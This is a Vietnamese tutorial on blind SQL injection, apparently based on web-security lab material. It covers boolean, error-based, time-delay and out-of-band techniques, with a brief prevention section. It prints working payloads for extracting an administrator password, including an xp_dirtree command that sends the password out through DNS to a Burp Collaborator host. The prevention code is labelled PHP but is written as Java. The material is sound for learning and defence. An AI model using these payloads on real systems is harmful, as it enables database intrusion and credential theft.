## Blind SQL
Blind SQL là gì: Chính là những lỗ hổng SQL không được render trực tiếp mà một cách khai thác ẩn được gọi là tấn công mù
Nó có thể trích xuất dữ liệu nhạy cảm thông qua những dấu hiệu như kích hoạt lỗi,
## Khai thác lỗ hổng SQL Injection bằng cách kích hoạt các phản hồi có điều kiện (Boolean)
Ở lỗ hổng này nó kiểm tra sự phản hồi có điều boolean kiểm tra đúng sai và kết quả dựa vào status của response trả về.
```cookie!
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
Khi yêu cầu TrackingId được xử lí, ứng dụng sẽ sử dụng truy vấn SQL để xác định xem có phải là của người dùng hay không với lệnh
```sql!
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
Ở đay nó sẽ nhận dạng người dùng với người dùng gửi dữ liệu và nhận dạng `TrackingId` truy vấn sẽ trả về dữ liệu nhận được thông báo `Welcome` trong phản hồi
Hành vi này kẻ tấn công có thể nhận biết tiến hành Inject SQL để kiểm tra sự phàn hồi khác nhau để tấn công SQL Injection mù.
Có 2 biểu thức để đánh giá chúng gửi đi như sau:
`...xyz' AND '1' = '1`
`...xyz' AND '1' = '0`
Giá trị đầu tiên đưa giá trị 1=1 luôn đúng nó trả về Welcome giá trị 2 nó trả về điều kiện sai
Điều này kẻ tấn công cho phép nó thấy điều kiện đưa vào và trích xuất dữ liệu từng phần một
Với cách này kẻ tấn công có thể sử dụng `SUBSTRING` để gửi hàng loạt kí tự để xác định được thông tin người dùng và tiến hành trích xuất dữ liệu
```sql!
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'm
```
Thao tác trả về thông báo `Welcome` thì chứng tỏ kí tự đầu tiên là giá trị đúng của password với username administrator và tương tự nó có thể sử dụng các kí tự tiếp theo để trích xuất thông tin.
## Attack SQL Injection dựa trên kích hoạt điều kiện lỗi
Loại này thường kẻ tấn công có thể sử dụng lợi dụng các trường hợp thông báo lỗi và từ đó có thể trích xuất dữ liệu hoặc suy luận dữ liệu nhạy cảm cơ sở dữ liệu.
> Có thể kích hoạt lỗi cụ thể dựa trên kết quả của một biểu thức Boolean
> Có thể kích hoạt các thông báo lỗi hiển thị dữ liệu được trả về bởi truy vấn.

Có thể khiến ứng dụng trả về phản hồi khác nhau tùy thuộc vào việc có xảy ra lỗi SQL hay không. Có thể sửa đổi truy vấn để nó chỉ gây ra lỗi cơ sở dữ liệu nếu điều kiện đúng.
Với chẳng hạn như thông báo lỗi. Điều này cho phép attack suy đoán được đúng sai kiểu dữ liệu đưa vào.
### Cách hoạt động Blind Error
Giả sử có 2 yêu cầu gửi đi với param: `TrackingId`
```sql!
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```
```sql!
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Các tham số đầu vào sử dụng `CASE` để đánh giá điều kiện và trả về biểu thức khác nhau.
> Với dữ liệu đầu vào đầu tiên, CASEbiểu thức được đánh giá là 'a', điều này không gây ra lỗi nào.
> Với đầu vào thứ hai, nó được đánh giá thành 1/0, dẫn đến lỗi chia cho 0.

Với kĩ thuật này có thể trích xuất dữ liệu
```sql!
xyz' AND (SELECT CASE WHEN (username='Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a
```
## Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi SQL chi tiết
Đôi khi cơ sở dữ liệu cấu hình sai dẫn đến thông báo lỗi dài dòng thông tin này kẻ tấn công có thể trích xuất dữ liệu khi chèn dấu nháy đơn 
```sql!
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
Bằng cách đó chúng ta có thể sử dụng `CAST()` hàm này để thực hiện cho phép chuyển đổi một số dữ liệu sang kiểu dữ liệu khác.
```sql!
CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)
```
Dữ liệu gắng đọc chuỗi kí tự sang kiểu dữ liệu ko tương thích như int sẽ khiến gây ra lỗi
## BLIND SQL dựa trên độ trễ Time
Kiểu này được kích hoạt độ trễ thời gian dựa vào đúng hay sai, trì hoãn thực thi truy vấn SQL cũng làm trì hoãn phản hồi HTTP
Giả sử như trên Microsof SQL Server, SQLite kiểm tra 2 lệnh khác nhau với sự kích hoạt.
```sql!
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
```
```sql!
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
Điều kiện 1=2 sai k gây ra độ trễ và 1=1 gây ra vì đó là điều kiện đúng sử dụng kĩ thuật này có thể trích xuất dữ liệu
```sql!
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
## Attack lỗ hổng SQL Injection bằng kỹ thuật ngoài băng tần
Công cụ dễ dàng đáng tin cậy nhất là sử dụng Burp Collaborator nó có nhiều dịch vụ mạng khác nhau, bao gồm cả DNS...
Giả sử như trên Microsoft SQL Server có thể được sử dụng để gây ra tra cứu DNS trên một tên miền cụ thể.
```sql!
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Điều này khiến cơ sở dữ liệu thực hiện tra cứu cho miền sau:
```txt!
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
sau khi xác nhận được cách thức làm việc có thể trích xuất dữ liệu ra ngoài băng tần
```sql!
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
Đầu vào sẽ tiến hành đọc password của Administrator và kết quả
```txt!
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```
## Cách phòng ngừa tấn công SQL injection
Sử dụng truy vấn tham số hóa thay vì nối chuỗi trong truy vấn, truy vấn tham số hóa được gọi là "Prepare"
```php!
<?php
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
?>
```
Thiết lập danh sách trắng cho các giá trị đầu vào được cho phép.
Sử dụng logic khác nhau để đạt được hành vi mong muốn

